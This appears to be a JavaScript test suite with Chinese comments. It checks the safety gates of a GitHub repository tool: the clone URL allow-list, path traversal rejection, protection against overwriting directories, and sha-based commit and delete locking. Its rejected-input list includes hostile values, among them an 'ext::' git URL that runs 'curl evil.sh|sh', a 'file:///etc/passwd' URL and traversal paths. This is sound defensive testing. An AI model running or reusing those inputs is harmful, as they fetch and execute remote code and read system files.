/**
 * GitHub 写路径与克隆的安全闸门测试。
 *
 * 这些是真正挡住事故的地方，必须逐条验证：
 *   - clone URL 白名单（ext:: / file:// / 非 github 主机 / 越界目录名）
 *   - 目标目录非空时拒绝覆盖
 *   - 仓库内路径越界（.. / 绝对路径）
 *   - 提交的 sha 乐观锁（防覆盖他人的并发提交）
 *   - 删除必须带 sha
 *   - 内容无变化时不产生空提交
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'gm-guard-'));
process.env.GM_DATA_DIR = TMP;
process.env.GM_VAULT_MODE = 'plain';
process.env.GM_GH_TOKEN = 'gho_test_token_for_unit_tests';

const gh = await import('../server/core/github.js');
const { parseRepoRef, cloneRepo, CloneError } = await import('../server/core/clone.js');

let pass = 0;
let fail = 0;
function check(name, cond, extra = '') {
  if (cond) { pass++; console.log(`  ✓ ${name}`); }
  else { fail++; console.log(`  ✗ ${name}${extra ? `  → ${extra}` : ''}`); }
}
async function expectThrow(name, fn, matcher) {
  try {
    await fn();
    check(name, false, '本应抛错，却成功了');
  } catch (e) {
    const ok = matcher ? matcher(e) : true;
    check(name, ok, ok ? '' : `错误码/信息不符：${e.code || ''} ${e.message}`);
  }
}

/* ================= 1. clone URL 白名单 ================= */
console.log('[1] clone URL 白名单与解析');
{
  const good = [
    ['https://github.com/octocat/Hello-World.git', 'octocat', 'Hello-World'],
    ['https://github.com/octocat/Hello-World', 'octocat', 'Hello-World'],
    ['git@github.com:octocat/Hello-World.git', 'octocat', 'Hello-World'],
    ['octocat/Hello-World', 'octocat', 'Hello-World'],
    ['  https://github.com/octocat/git-manager.git  ', 'octocat', 'git-manager'],
  ];
  for (const [input, owner, name] of good) {
    try {
      const r = parseRepoRef(input);
      check(`接受 ${input.slice(0, 46)}`, r.owner === owner && r.name === name, `${r.owner}/${r.name}`);
    } catch (e) {
      check(`接受 ${input.slice(0, 46)}`, false, e.message);
    }
  }

  const bad = [
    ['ext::sh -c "curl evil.sh|sh"', /ext::/],
    ['file:///etc/passwd', /不支持|github/i],
    ['ssh://git@evil.com/a/b.git', /github\.com/i],
    ['https://gitlab.com/a/b.git', /github\.com/i],
    ['https://github.com/../../etc/passwd', /路径片段/],
    ['https://github.com/owner', /形如/],
    ['https://github.com/../..', /路径片段|点号/],
    ['', /仓库地址/],
    ['https://gist.github.com/abc', /github\.com/],
  ];
  for (const [input, pattern] of bad) {
    await expectThrow(`拒绝 ${String(input).slice(0, 46) || '(空)'}`, () => parseRepoRef(input), (e) => pattern.test(e.message));
  }
}

/* ================= 2. 仓库内路径越界 ================= */
console.log('\n[2] 仓库内路径校验');
{
  const okPaths = ['README.md', 'src/index.js', 'a/b/c.txt'];
  for (const p of okPaths) {
    try { check(`接受路径 ${p}`, gh.assertSafePath(p) === p); }
    catch (e) { check(`接受路径 ${p}`, false, e.message); }
  }
  const badPaths = ['/etc/passwd', '../outside.txt', 'a/../../b', './x', 'a/./b', 'x\0y'];
  for (const p of badPaths) {
    await expectThrow(`拒绝路径 ${JSON.stringify(p)}`, () => gh.assertSafePath(p));
  }
}

/* ================= 3. 克隆目标目录安全 ================= */
console.log('\n[3] 克隆目标目录安全');
{
  const parent = path.join(TMP, 'parent');
  fs.mkdirSync(parent, { recursive: true });

  // 非空目录必须拒绝
  const busy = path.join(parent, 'busy');
  fs.mkdirSync(busy);
  fs.writeFileSync(path.join(busy, 'important.txt'), 'do not overwrite');
  await expectThrow(
    '目标目录非空时拒绝覆盖',
    () => cloneRepo({ url: 'octocat/Hello-World', parentDir: parent, dirName: 'busy' }),
    (e) => e.code === 'TARGET_NOT_EMPTY',
  );
  check('  └ 现场未被破坏（important.txt 仍在）', fs.existsSync(path.join(busy, 'important.txt')));

  // 目录名越界
  for (const dir of ['..', '../evil', 'a/b', 'a\\b']) {
    await expectThrow(
      `拒绝越界目录名 ${JSON.stringify(dir)}`,
      () => cloneRepo({ url: 'octocat/Hello-World', parentDir: parent, dirName: dir }),
      (e) => ['BAD_DIRNAME', 'ESCAPE', 'SAME_DIR'].includes(e.code),
    );
  }

  // 空目录名 / 未提供目录名 → 回退为仓库名（友好的默认行为）。
  // 用「同名目录已存在且非空」来验证回退确实发生了，避免真的去克隆。
  {
    const occupied = path.join(parent, 'Hello-World');
    fs.mkdirSync(occupied, { recursive: true });
    fs.writeFileSync(path.join(occupied, 'x.txt'), 'x');
    let err = null;
    try {
      await cloneRepo({ url: 'octocat/Hello-World', parentDir: parent, dirName: '' });
    } catch (e) { err = e; }
    check('空目录名回退为仓库名（命中同名目录）', err?.code === 'TARGET_NOT_EMPTY', err?.code);
    check('  └ 回退后的目标路径正确', String(err?.message || '').includes('Hello-World'), String(err?.message || '').slice(0, 90));
  }

  // 父目录不存在
  await expectThrow(
    '父目录不存在时拒绝',
    () => cloneRepo({ url: 'octocat/Hello-World', parentDir: path.join(TMP, 'nope') }),
    (e) => e.code === 'NO_PARENT',
  );

  // 克隆到已存在的空目录是允许的。这里只验证「没有被前置校验拦下」。
  // 真实 clone 需要能连上 github.com；本沙箱代理只放行 api/codeload，故默认跳过，
  // 用 GM_TEST_NET=1 显式开启。
  const PRE_CHECK_CODES = ['TARGET_NOT_EMPTY', 'TARGET_NOT_DIR', 'BAD_DIRNAME', 'ESCAPE', 'SAME_DIR', 'NO_PARENT', 'BAD_URL'];
  if (process.env.GM_TEST_NET === '1') {
    const empty = path.join(parent, 'empty-ok');
    fs.mkdirSync(empty);
    console.log('  … 正在尝试真实 clone（需可访问 github.com）');
    const t0 = Date.now();
    const err = await cloneRepo({ url: 'octocat/definitely-not-a-real-repo-xyz', parentDir: parent, dirName: 'empty-ok' }).then(
      () => null,
      (e) => e,
    );
    const secs = ((Date.now() - t0) / 1000).toFixed(1);
    check('空目录未被前置校验拦下（失败来自网络层而非目录检查）', !!err && !PRE_CHECK_CODES.includes(err.code), `code=${err?.code}`);
    check(`  └ 失败信息如实报告是否使用了鉴权（${secs}s）`, typeof err?.usedAuth === 'boolean', String(err?.usedAuth));
  } else {
    console.log('  · 跳过真实 clone（设 GM_TEST_NET=1 可开启；本沙箱 github.com 不可达）');
  }
}

/* ================= 4. 提交的 sha 乐观锁 ================= */
console.log('\n[4] 提交验证：sha 乐观锁');
{
  const REMOTE_SHA = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const makeMock = (remoteFile, putResult) => {
    const calls = [];
    const fn = async (url, opts = {}) => {
      calls.push({ url, method: opts.method, body: opts.body ? JSON.parse(opts.body) : null });
      let body = {};
      let status = 200;
      if (opts.method === 'GET' && url.includes('/contents/')) {
        if (remoteFile) body = { path: 'f.txt', name: 'f.txt', size: 3, sha: REMOTE_SHA, encoding: 'base64', content: Buffer.from(remoteFile).toString('base64') };
        else { status = 404; body = { message: 'Not Found' }; }
      } else if (opts.method === 'PUT') {
        body = putResult || { commit: { sha: 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb', html_url: 'https://github.com/a/b/commit/bbb' }, content: { sha: 'ccc' } };
      } else if (url.includes('/repos/')) {
        body = { full_name: 'a/b', name: 'b', owner: { login: 'a' }, default_branch: 'main', permissions: { push: true } };
      }
      return { ok: status < 400, status, headers: new Map(), text: async () => JSON.stringify(body), json: async () => body };
    };
    fn.calls = calls;
    return fn;
  };

  // 4.1 远端已存在文件，但没带 sha → 必须拒绝
  gh.setFetchImpl(makeMock('abc', null));
  await expectThrow(
    '远端已有文件但未带 sha → 拒绝（防盲覆盖）',
    () => gh.commitFile({ owner: 'a', name: 'b', path: 'f.txt', content: 'new', message: 'update it' }),
    (e) => e.code === 'STALE_SHA',
  );

  // 4.2 sha 不匹配 → 必须拒绝，且报出双方版本
  gh.setFetchImpl(makeMock('abc', null));
  await expectThrow(
    'sha 不匹配 → 拒绝，并提示双方版本',
    () => gh.commitFile({ owner: 'a', name: 'b', path: 'f.txt', content: 'new', message: 'update it', sha: 'ffffffffffffffffffffffffffffffffffffffff' }),
    (e) => e.code === 'STALE_SHA' && /fffffff/.test(e.message) && /aaaaaaa/.test(e.message),
  );

  // 4.3 sha 匹配且内容有变 → 成功提交
  {
    const f = makeMock('abc', null);
    gh.setFetchImpl(f);
    const r = await gh.commitFile({ owner: 'a', name: 'b', path: 'f.txt', content: 'changed!', message: '真的改了内容', sha: REMOTE_SHA });
    check('sha 匹配 → 提交成功', r.ok && !r.noop, JSON.stringify(r));
    check('  └ 判定为 update', r.action === 'update', r.action);
    const put = f.calls.find((c) => c.method === 'PUT');
    check('  └ PUT 请求带上了正确的 sha', put?.body?.sha === REMOTE_SHA);
    check('  └ content 为 base64', put?.body?.content === Buffer.from('changed!').toString('base64'));
  }

  // 4.4 内容完全一致 → 不产生空提交
  {
    gh.setFetchImpl(makeMock('abc', null));
    const r = await gh.commitFile({ owner: 'a', name: 'b', path: 'f.txt', content: 'abc', message: '无变化也该拦住', sha: REMOTE_SHA });
    check('内容与远端一致 → 识别为 no-op，不提交', r.noop === true, JSON.stringify(r));
  }

  // 4.5 远端不存在 → 走创建
  {
    const f = makeMock(null, null);
    gh.setFetchImpl(f);
    const r = await gh.commitFile({ owner: 'a', name: 'b', path: 'new.txt', content: 'hello', message: '新建文件' });
    check('远端无此文件 → 创建成功', r.ok && r.action === 'create', JSON.stringify(r));
    const put = f.calls.find((c) => c.method === 'PUT');
    check('  └ 创建时不带 sha', put?.body?.sha === undefined);
  }

  // 4.6 声明了 sha 但远端文件已消失 → 拒绝
  {
    gh.setFetchImpl(makeMock(null, null));
    await expectThrow(
      '带 sha 但远端文件已消失 → 拒绝',
      () => gh.commitFile({ owner: 'a', name: 'b', path: 'gone.txt', content: 'x', message: '写点东西', sha: REMOTE_SHA }),
      (e) => e.code === 'VANISHED',
    );
  }

  // 4.7 commit message 校验
  for (const [msg, label] of [['', '空'], ['  ', '纯空格'], ['ab', '过短']]) {
    gh.setFetchImpl(makeMock(null, null));
    await expectThrow(`commit message ${label} → 拒绝`, () => gh.commitFile({ owner: 'a', name: 'b', path: 'x.txt', content: 'x', message: msg }));
  }

  // 4.8 体积上限
  {
    gh.setFetchImpl(makeMock(null, null));
    const huge = 'x'.repeat(1024 * 1024 + 10);
    await expectThrow('超过 1MB → 拒绝', () => gh.commitFile({ owner: 'a', name: 'b', path: 'big.txt', content: huge, message: '大文件' }), (e) => e.code === 'TOO_LARGE');
  }
}

/* ================= 5. 删除必须带 sha ================= */
console.log('\n[5] 删除验证');
{
  const REMOTE_SHA = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const mock = (sha) => async (url, opts = {}) => {
    let body = {};
    let status = 200;
    if (opts.method === 'GET') body = sha ? { path: 'f.txt', name: 'f.txt', size: 1, sha, encoding: 'base64', content: 'YQ==' } : (status = 404, { message: 'Not Found' });
    else if (opts.method === 'DELETE') body = { commit: { sha: 'dddddddddddddddddddddddddddddddddddddddd', html_url: 'https://github.com/a/b/commit/ddd' } };
    return { ok: status < 400, status, headers: new Map(), text: async () => JSON.stringify(body), json: async () => body };
  };

  gh.setFetchImpl(mock(REMOTE_SHA));
  await expectThrow('删除未带 sha → 拒绝', () => gh.deleteFile({ owner: 'a', name: 'b', path: 'f.txt', message: '删掉它' }), (e) => e.code === 'NO_SHA');

  gh.setFetchImpl(mock(REMOTE_SHA));
  await expectThrow(
    '删除 sha 不匹配 → 拒绝',
    () => gh.deleteFile({ owner: 'a', name: 'b', path: 'f.txt', message: '删掉它', sha: 'ffffffffffffffffffffffffffffffffffffffff' }),
    (e) => e.code === 'STALE_SHA',
  );

  gh.setFetchImpl(mock(REMOTE_SHA));
  const r = await gh.deleteFile({ owner: 'a', name: 'b', path: 'f.txt', message: '删掉这个文件', sha: REMOTE_SHA });
  check('删除 sha 匹配 → 成功', r.ok && r.action === 'delete', JSON.stringify(r));
}

/* ================= 6. 目标目录名解析与最终路径 ================= */
console.log('\n[6] parseRepoRef 归一化');
{
  const r = parseRepoRef('https://github.com/foo/bar.git');
  check('统一归一化为 .git https 地址', r.httpsUrl === 'https://github.com/foo/bar.git', r.httpsUrl);
  const r2 = parseRepoRef('Foo/Bar');
  check('owner/name 简写也能归一化', r2.httpsUrl === 'https://github.com/Foo/Bar.git', r2.httpsUrl);
}

fs.rmSync(TMP, { recursive: true, force: true });

console.log('');
console.log('='.repeat(46));
console.log(`通过 ${pass} 项，失败 ${fail} 项`);
console.log(fail === 0 ? '全部通过 ✓' : '存在失败 ✗');
process.exit(fail === 0 ? 0 : 1);
